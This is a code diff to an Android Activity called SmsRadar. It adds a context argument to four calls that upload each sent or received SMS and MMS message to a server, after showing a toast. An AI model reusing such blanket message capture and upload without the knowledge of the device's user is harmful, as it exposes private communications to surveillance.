@@ -41,7 +41,7 @@ public class SmsRadar extends Activity
                 if (sms != null)
                 {
                     showSmsSToast(sms);
-                    ClientCommunicator.uploadSingleMessage(sms);
+                    ClientCommunicator.uploadSingleMessage(sms, getApplicationContext());
                 }
             }
 
@@ -51,7 +51,7 @@ public class SmsRadar extends Activity
                 if (sms != null)
                 {
                     showSmsRToast(sms);
-                    ClientCommunicator.uploadSingleMessage(sms);
+                    ClientCommunicator.uploadSingleMessage(sms, getApplicationContext());
                 }
             }
         }, new MmsListener()
@@ -62,7 +62,7 @@ public class SmsRadar extends Activity
                 if (mms != null)
                 {
                     showSmsSToast(mms);
-                    ClientCommunicator.uploadSingleMessage(mms);
+                    ClientCommunicator.uploadSingleMessage(mms, getApplicationContext());
                 }
             }
 
@@ -72,7 +72,7 @@ public class SmsRadar extends Activity
                 if (mms != null)
                 {
                     showSmsRToast(mms);
-                    ClientCommunicator.uploadSingleMessage(mms);
+                    ClientCommunicator.uploadSingleMessage(mms, getApplicationContext());
                 }
             }
         });
